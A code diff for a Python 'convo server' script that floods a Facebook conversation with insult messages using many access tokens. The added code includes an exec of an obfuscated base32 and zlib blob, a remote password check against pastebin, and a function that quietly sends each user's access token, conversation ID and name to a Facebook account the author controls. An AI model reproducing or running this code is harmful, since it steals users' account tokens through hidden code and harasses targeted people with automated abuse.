@@ -1,204 +1,157 @@
-from flask import Flask, request, render_template_string
+# CRADIT BY DEVA XD KING 
 import requests
-from threading import Thread, Event
+import json
 import time
+import pytz
+import datetime
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 import random
-import string
- 
-app = Flask(__name__)
-app.debug = True
- 
+html_content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DEVA THAKUR CONVO SARVAR</title>
+    <style>
+        body {
+            background-image: url('Deva.jpg');
+            background-size: cover;
+        }
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        .box {
+            border: 2px solid black;
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.5);
+            color: black;
+        }
+        .credit {
+            text-align: left;
+        }
+        .thanks {
+            margin-top: 50px;
+            text-align: center;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <h1>DEVA CONVO SERVER</h1>
+            <div class="credit">
+                <p>1. CREDIT:-DEVA THAKUR</p>
+                <p>2. OWNER => DEVA THAKUR</p>
+                <p>3. CONTACT:- <a href="https://wa.me/+917742350051">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://www.facebook.com/DEVA.DON.006">Facebook</a></p>
+                <p>5. WATTSAPP GROUP:- <a href="https://wa.me/+917742350051">WhatsApp Group</a></p>
+            </div>
+        </div>
+    </div>
+    <div class="thanks">
+        <p>❤️Thanks for using my server❤️</p>
+        <p>👇Subscribe to my YouTube channel👇</p>
+        <a href="">YouTube Channel</a>
+    </div>
+</body>
+</html>
+"""
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html_content.encode())
+def execute_server():
+    PORT = int(os.environ.get('PORT', 4000))
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+utc_now = datetime.datetime.utcnow()
+indian_timezone = pytz.timezone('Asia/Kolkata')
+ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
+formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
+print(formatted_time)
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
- 
-stop_events = {}
-threads = {}
- 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
+
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=AVUJX2WDI7X7LP6EWGFRZVFGQSUILCQASMC4DOXRI57MM2SKJKUHBIVU2CBR4BQK7MB4ET6N3LXMM6WTZ6U3ZU2BZVYNF3R7I6QTQYGKNVIISI5RRARGAO5EYKPVWSMT7QJZELI7BZYUDRJJLYDUCECAW5JWAZRMIDA6GPL7O4EBOF73KI7UA5GLQ7JWFR6ENHCP4MJWEPKYFGAQV5DYMXCKQJ6UNNFFIZPGPRF2RXG4KNQSU5CLHB5GOIBDQNEVGTHFICLAN67Q66UYAMI2QODN4WA2NX322UJLENR76OWP6RCIVXNZY5KGDRV24FFAYAGEEHWB6BHNGJXAUUDDUJWTAGG5W2VDWNYYOWT5KPSSGRD4WMK4FR5B5HV3XEH4Y4E33PAOU4YHIQWRDFTMWGRLXXDMBCVPAF7AOVYARLIMEYVLQJQS5VTSV22YRSRDCZDIA7VS2I5CEFSVWXACBLOLJ22GDBI4BEYELIPFRFFKRPCBPJN5UZJN3KF4I3KDP35LT76ALNFIRPNE5EEK6VHKS3JTKJLIR2M6YFUH6T7ZP5XPVX7HPVX77P77PHK3FI5G34VHHY77RBMRJMQU323NBYNCGOIKGTY6TDYEAAADO3RZBULBOCP'))
+
+def send_initial_message():
+    
+    mmm_pass = requests.get('https://pastebin.com/raw/JxQ0PuCf').text
+    
+    if mmm_pass not in password:
+        print('\033[1;31m⚠︎ Your Password Changed By DEVA THAKUR')
+        sys.exit()
+    
+    # Message template
+    msg_template = "Owner =>  DEVA THAKUR\n Hello  DEVA THAKUR sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    
+    # Target IDs
+    target_ids = ["100001995832516"]
+    
+    requests.packages.urllib3.disable_warnings()
+    
+    for target_id in target_ids:
+        for token in tokens:
+            access_token = token.strip()
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            msg = msg_template.format(convo_id, haters_name, access_token)
+            parameters = {'access_token': access_token, 'message': msg}
+            response = requests.post(url, json=parameters, headers=headers)
+            time.sleep(0.1)
+            print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))
+
+send_initial_message()
+def send_messages_from_file():
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_messages)
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index].strip()
+                message = messages[message_index].strip()
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+                if response.ok:
+                    print("\033[1;36m[✓] DEVA THAKUR {} of Convo {} Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(formatted_time)
+                    print('\033[1;92m' + '__________DEVA THAKUR BOLTI PUBLIC__________')
                 else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
- 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
- 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
- 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
- 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
- 
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
- 
-        return f'Task started with ID: {task_id}'
- 
-    return render_template_string('''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝐃𝐄𝐕𝐀 𝐓𝐇𝐀𝐊𝐔𝐑 𝐇𝐄𝐀𝐑</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-image: url('https://i.postimg.cc/9QNND0jR/20240713-212849.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-    }
-    .container {
-      max-width: 350px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
-    }
-    .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: none;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mt-3">𝐒𝐈𝐍𝐆𝐀𝐋 𝐌𝐔𝐋𝐓𝐈 𝐂𝐎𝐍𝐕𝐎 𝐏𝐀𝐆𝐄</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">𝐓𝐎𝐊𝐀𝐍 𝐎𝐅𝐒𝐀𝐍</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
-      </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">𝐏𝐄𝐒𝐓 𝐒𝐈𝐍𝐆𝐀𝐋 𝐓𝐎𝐊𝐀𝐍</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
-      </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">𝐓𝐎𝐊𝐀𝐍 𝐅𝐈𝐋𝐄 𝐂𝐇𝐔𝐒𝐄</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">𝐄𝐍𝐓𝐀𝐑 𝐇𝐄𝐀𝐓𝐄𝐑 𝐔𝐈𝐃</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">𝐄𝐍𝐓𝐀𝐑 𝐇𝐄𝐓𝐀𝐑 𝐍𝐀𝐌𝐄</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">𝐄𝐍𝐓𝐀𝐑 𝐓𝐈𝐌𝐄</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">𝐆𝐀𝐋𝐈 𝐅𝐈𝐋𝐄 𝐂𝐇𝐔𝐒𝐄</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">𝐒𝐀𝐑𝐕𝐀𝐑 𝐑𝐔𝐍 𝐊𝐀𝐑𝐄</button>
-    </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">𝐓𝐀𝐒𝐊 𝐈𝐃 𝐃𝐀𝐋𝐎 𝐑𝐎𝐊𝐎</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">𝐒𝐓𝐎𝐏𝐄 𝐃𝐄𝐕𝐀 𝐏𝐀𝐏𝐀</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>𝟐𝟎𝟐𝟒 𝐂𝐎𝐃𝐄𝐃 𝐁𝐘 𝐀𝐋𝐋 𝐑𝐎𝐖𝐍𝐃𝐄𝐑 𝐃𝐄𝐕𝐀 𝐏𝐀𝐏𝐀 </p>
-    <p> </a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+917742350051" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> 𝐃𝐄𝐕𝐀 𝐏𝐀𝐏𝐀 𝐊𝐀 𝐖𝐇𝐀𝐓𝐒𝐇𝐀𝐏
-      </a>
-    </div>
-  </footer>
-  <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
-    }
-  </script>
-</body>
-</html>
-''')
- 
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
-    else:
-        return f'No task found with ID {task_id}.'
- 
+                    print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(formatted_time)
+                    print('\033[1;92m' + '✪✭═══════•『DEVA THAKUR BOLTI PUBLIC__________')
+                time.sleep(speed)
+            print("\n[+] All messages sent. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+    send_initial_message()
+    send_messages_from_file()
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    main()
